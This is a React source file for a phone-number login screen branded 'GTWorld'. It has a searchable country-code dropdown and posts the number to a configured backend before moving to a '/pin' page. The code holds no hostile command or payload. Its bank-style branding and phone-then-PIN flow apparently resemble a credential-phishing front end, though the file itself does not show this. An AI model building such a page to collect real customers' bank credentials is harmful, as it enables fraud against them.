import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { HiChevronDown } from "react-icons/hi";
import { HiMagnifyingGlass } from "react-icons/hi2";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import COUNTRIES from "../components/countries";

// Dynamic hex colours cannot be expressed as Tailwind classes — inline style is unavoidable here
const FlagDot = ({ bands }) => (
  <span className="relative inline-block h-6 w-6 overflow-hidden rounded-full shrink-0">
    {bands.map((color, i) => (
      <span
        key={i}
        className="absolute inset-y-0"
        style={{
          left: `${(i * 100) / bands.length}%`,
          width: `${100 / bands.length}%`,
          backgroundColor: color,
        }}
      />
    ))}
  </span>
);

const schema = yup.object().shape({
  phone: yup
    .string()
    .required("Phone number is required")
    .matches(/^\d{7,11}$/, "Enter a valid phone number"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [country, setCountry] = useState(
    COUNTRIES.find((c) => c.code === "NG"),
  );
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [search, setSearch] = useState("");
  const dropdownRef = useRef(null);
  const searchRef = useRef(null);

  const filtered = COUNTRIES.filter(
    (c) =>
      c.name.toLowerCase().includes(search.toLowerCase()) ||
      c.dial.includes(search) ||
      c.code.toLowerCase().includes(search.toLowerCase()),
  );

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  useEffect(() => {
    const handleClickOutside = (e) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target)) {
        setDropdownOpen(false);
        setSearch("");
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  useEffect(() => {
    if (dropdownOpen && searchRef.current) {
      searchRef.current.focus();
    }
  }, [dropdownOpen]);

  const submitForm = (data) => {
    setLoading(true);
    const fullPhone = `${country.dial}${data.phone}`;
    localStorage.setItem("gt_phone", fullPhone);
    axios
      .post(`${BASE_URL}/`, { phone: fullPhone })
      .then(() => navigate("/pin"))
      .catch((error) => console.error("There was an error!", error))
      .finally(() => setLoading(false));
  };

  return (
    <div className="min-h-screen w-full bg-gray-100 flex justify-center">
      <div className="w-full min-h-screen flex flex-col px-3">
        {/* Heading */}
        <div className="mt-16">
          <h1 className="text-[38px] font-black text-gray-900 leading-none tracking-tight">
            Hello!
          </h1>
          <p className="mt-3 text-[15px] text-gray-500 leading-snug font-normal">
            Welcome to GTWorld! Enter your phone number to login or sign up.
          </p>
        </div>

        {/* Phone input */}
        <form onSubmit={handleSubmit(submitForm)} className="mt-8">
          <div className="flex items-stretch rounded-2xl bg-white border border-gray-200 shadow-sm overflow-visible">
            {/* Country selector — border on wrapping div so button has no border conflicts */}
            <div
              className="relative border-r border-gray-200"
              ref={dropdownRef}
            >
              <button
                type="button"
                onClick={() => setDropdownOpen((o) => !o)}
                className="h-full flex items-center gap-2 pl-4 pr-3 py-5 bg-transparent cursor-pointer"
              >
                <FlagDot bands={country.flag} />
                <span className="text-[16px] font-semibold text-gray-900 leading-none">
                  {country.dial}
                </span>
                <HiChevronDown
                  className={`text-gray-400 text-base transition-transform duration-200 ${
                    dropdownOpen ? "rotate-180" : "rotate-0"
                  }`}
                />
              </button>

              {dropdownOpen && (
                <ul className="absolute z-20 top-full mt-1 w-56 rounded-xl bg-white shadow-lg border border-gray-200 list-none overflow-hidden">
                  {/* Search box */}
                  <li className="px-3 pt-2 pb-1 sticky top-0 bg-white border-b border-gray-100">
                    <div className="flex items-center gap-2 bg-gray-50 rounded-lg px-2 py-1.5">
                      <HiMagnifyingGlass className="text-gray-400 text-sm shrink-0" />
                      <input
                        ref={searchRef}
                        type="text"
                        placeholder="Search country…"
                        value={search}
                        onChange={(e) => setSearch(e.target.value)}
                        className="flex-1 min-w-0 text-sm bg-transparent outline-none text-gray-700 placeholder-gray-400"
                      />
                    </div>
                  </li>
                  {/* Country list */}
                  <div className="max-h-56 overflow-y-auto">
                    {filtered.length === 0 ? (
                      <li className="px-4 py-3 text-sm text-gray-400 text-center">
                        No results
                      </li>
                    ) : (
                      filtered.map((c) => (
                        <li key={c.code}>
                          <button
                            type="button"
                            onClick={() => {
                              setCountry(c);
                              setDropdownOpen(false);
                              setSearch("");
                            }}
                            className="w-full flex items-center gap-2 px-3 py-2 text-left bg-transparent cursor-pointer hover:bg-gray-50"
                          >
                            <FlagDot bands={c.flag} />
                            <span className="text-sm font-semibold text-gray-800">
                              {c.code}
                            </span>
                            <span className="text-sm text-gray-400 truncate">
                              {c.name}
                            </span>
                            <span className="text-sm text-gray-400 ml-auto shrink-0">
                              {c.dial}
                            </span>
                          </button>
                        </li>
                      ))
                    )}
                  </div>
                </ul>
              )}
            </div>

            {/* Phone number field */}
            <input
              type="tel"
              inputMode="numeric"
              placeholder="000 000 0000"
              className="flex-1 min-w-0 px-4 py-5 text-[16px] text-gray-800 placeholder-gray-300 bg-transparent outline-none"
              {...register("phone")}
            />
          </div>
          <FormErrMsg errors={errors} inputName="phone" />

          {/* Disclaimer */}
          <p className="mt-4 text-[13px] text-gray-400 leading-relaxed">
            By providing your phone number, you agree to our{" "}
            <a
              href="/privacy"
              className="text-[#FA5621] font-semibold no-underline"
            >
              Privacy Policy
            </a>{" "}
            and{" "}
            <a
              href="/terms"
              className="text-[#FA5621] font-semibold no-underline"
            >
              Terms of use
            </a>
          </p>
        </form>

        {/* Proceed button — pinned bottom-right */}
        <div className="mt-auto pb-10 pt-6 flex justify-end">
          <button
            type="submit"
            disabled={loading}
            onClick={handleSubmit(submitForm)}
            className="bg-[#FA5621] hover:bg-[#e04d1c] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-[16px] px-10 py-5 rounded-2xl cursor-pointer transition-colors duration-200 shadow-lg"
          >
            {loading ? "Please wait..." : "Proceed"}
          </button>
        </div>
      </div>
    </div>
  );
};

export default Home;
